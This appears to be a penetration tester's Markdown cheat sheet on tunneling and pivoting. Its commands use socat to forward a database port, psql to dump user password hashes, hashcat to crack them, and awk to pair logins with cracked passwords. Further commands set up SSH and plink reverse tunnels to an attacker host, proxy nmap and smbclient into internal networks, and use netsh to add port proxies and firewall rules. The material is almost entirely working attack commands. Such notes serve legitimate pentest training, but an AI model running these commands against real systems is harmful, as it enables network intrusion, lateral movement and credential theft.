# Tunneling

## Port forwarding

### Socat

Run a Socat tunnel on the gateway to the database:
```
gateway$ socat -ddd TCP-LISTEN:2345,fork TCP:DbHostIP:5432
```
and connect to the DB directly from Kali (and retrieve password hashes):
```
kali$ psql -h GatewayIP -p 2345 -U postgres
> \l
> \c mydb
> select table_schema,table_name from information_schema.tables where table_name like '%user%;
> \o hashes.txt
> select * from user_table
> \o
> \q
```
Crack the hashes:
```
kali$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt # Atlassian hashcat code: hashcat -h
kali$ vim afterhashcat.txt
kali$ tr -d ' ' hashes.txt | awk -F'|' '(NR >2) {print $2, $17}' > loginpass.txt
kali$ vim loginpass.txt # clean ?
kali$ awk -F' ' '{a[$1]=a[$1]?a[$1]":"$2:$2":"$1;}END{for (i in a) print a[i];}' loginpass.txt afterhashcat.txt | awk -F ':' '$3 {print $1, $3}' > final.txt
```

Notes:
- Confluence config file: `/var/atlassian/application-data/confluence/confluence.cfg.xml`
- Awk tips: https://www.theunixschool.com/2012/06/awk-10-examples-to-group-data-in-csv-or.html

### Ssh

IpAttacker <--|--> IpDmzOut <--DMZ--> IpDmzIn <--|--> IpDeepIn

```
python3 -c 'import pty; pty.spawn("/bin/sh")' # python3 -c 'import pty; pty.spawn(["env","TERM=xterm-256color","/bin/bash","--rcfile", "/etc/bash.bashrc","-i"])'
nc -zv -w 1 $IP $Port # listen, verbose, timeout 1sec

IpDmzOut$ ssh -N -L 0.0.0.0:$PortDmzOut:$IpDeepInternal:$PortDeepInternal user@$IpDmzIn # from $IpDmzOut: out | dmz | in
Kali$ smbclient -p $PortDmzOut -L //$IpDmzOut/ -U someuser --password=somepass

IpDmzOut$ ssh -N -D 0.0.0.0:$PortDmzOut user@$IpDmzIn
Kali$ vi /etc/proxychains4.conf
    socks5 $IpDmzIn $PortDmzOut
Kali$ proxychains smbclient -L //$IpDeepInternal/ -U someuser --password=somepass
Kali$ proxychains nmap -vvv -sT --top-ports=20 -Pn $IpDeepInternal

ssh -N -R localhost:2345:$IpDmzIn:$PortDmzIn user@IpAttacker

```

### Windows

#### Ssh.exe

```
Windows PS> ssh.exe -N -R $ListeningPort user@$IpAttacker
Kali$ ss -lntpu # check
Kali$ vim /etc/proxychains4.conf
    socks5 127.0.0.1 $ListeningPort
Kali$ proxychains mycommand myoptions
```

#### Plink

```
KaliRshell$ cmdprompt> C:\path\to\plink.exe -ssh -l kaliuser -pw somepass -R 127.0.0.1:9833:127.0.0.1:3389 $IpAttacker
KaliRshell$ cmdprompt> KaliNormalShell$ ss -ntplu # check
Kali$ xfreerdp /u:rdp_user /p:rdp_pass /v:127.0.0.1:9833
```

#### Netsh

```
> netsh interface portproxy add v4tov4 listenport=2222 listenaddress=$IpDmzOut connectport=22 connectaddress=$IpDmzIn
> netstat -anp TCP | find "2222"
> netsh interface portproxy show all
> netsh advfirewall firewall add rule name="my_rule_name" protocol=TCP dir=in localip=$IpDmzOut localport=2222 action=allow
$ ssh user@$IpDmzOut -p2222
> netsh advfirewall firewall delete rule name="my_rule_name"
> netsh interface portproxy del v4tov4 listenport=2222 listenaddress=$IpDmzOut
> netsh interface portproxy show all
```



